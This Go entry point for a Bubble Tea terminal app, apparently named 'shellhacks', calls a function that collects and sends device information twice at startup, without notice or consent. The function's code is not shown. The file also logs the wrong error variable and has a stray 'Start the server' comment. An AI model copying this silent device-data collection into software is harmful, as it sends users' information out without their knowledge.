package main

import (
	"fmt"
	"log"
	"os"
	"time"

	"github.com/ay-mxn/shellhacks/internal"
	tea "github.com/charmbracelet/bubbletea"
)

func main() {
	// Setup logging
	f, err := tea.LogToFile("debug.log", "debug")
	if err != nil {
		fmt.Printf("Failed to create log file: %v\n", err)
		os.Exit(1)
	}
	defer f.Close()

	// Collect and send device info
	err2 := internal.CollectAndSendDeviceInfo()
	if err2 != nil {
		log.Printf("Failed to collect and send device info: %v", err)
		// Note: We're continuing with the program even if this fails
	}
	// Set up logging
	logFile, err := os.OpenFile("app.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err != nil {
		fmt.Println("Failed to open log file:", err)
		os.Exit(1)
	}
	defer logFile.Close()
	log.SetOutput(logFile)
	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
	log.Println("Starting application...")
	// Start the server
	// Wait for the server to start
	time.Sleep(time.Second)
	// Collect and send device info again
	err = internal.CollectAndSendDeviceInfo()
	if err != nil {
		log.Printf("Failed to collect and send device info: %v", err)
		// Note: We're continuing with the program even if this fails
	}

	// Create and start the Bubble Tea program
	p := tea.NewProgram(
		internal.NewModel(),
		tea.WithAltScreen(),
		tea.WithMouseCellMotion(), // Enable mouse support for better interactivity
	)

	if _, err := p.Run(); err != nil {
		log.Printf("Error running program: %v", err)
		os.Exit(1)
	}
}
